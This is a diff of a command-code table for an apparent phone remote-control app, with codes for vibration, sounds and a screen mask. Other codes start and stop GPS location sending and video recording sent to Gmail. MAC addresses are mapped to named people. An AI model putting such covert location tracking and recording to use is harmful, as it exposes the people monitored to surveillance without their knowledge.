@@ -1,18 +1,25 @@
 ======================================================= Data:
-0       - none
-A1      - vibrate always
-A2      - vibrate once
-A3      - set max volume
-A4      - set max volume in force and disable shutdown
-A5      - send to gmail device location
-A6      - uninstall app
-A7      - start video recording
-A8      - stop video recording and sending to gmail
-B0      - start transparent mask
-B1      - stop transparent mask
-poop1   - play sound 1
-poop2   - play sound 2
-poop3   - play sound 3
+
+0     - none
+
+S1    - vibrate always
+S2    - vibrate once
+S3    - set max volume
+
+P1    - play sound 1
+P2    - play sound 2
+P3    - play sound 3
+
+G0    - stop GPS sending cycle
+G1    - start GPS sending cycle
+
+V0    - stop video recording and sending to gmail
+V1    - start video recording
+
+M0    - stop transparent mask
+M1    - start transparent mask
+
 =======================================================
-98:F1:70:8B:9D:0D="0" (eli)
-d0:51:62:e6:ed:bb="0" (david)
+
+98:F1:70:8B:9D:0D="" (eli)
+d0:51:62:e6:ed:bb="" (david)
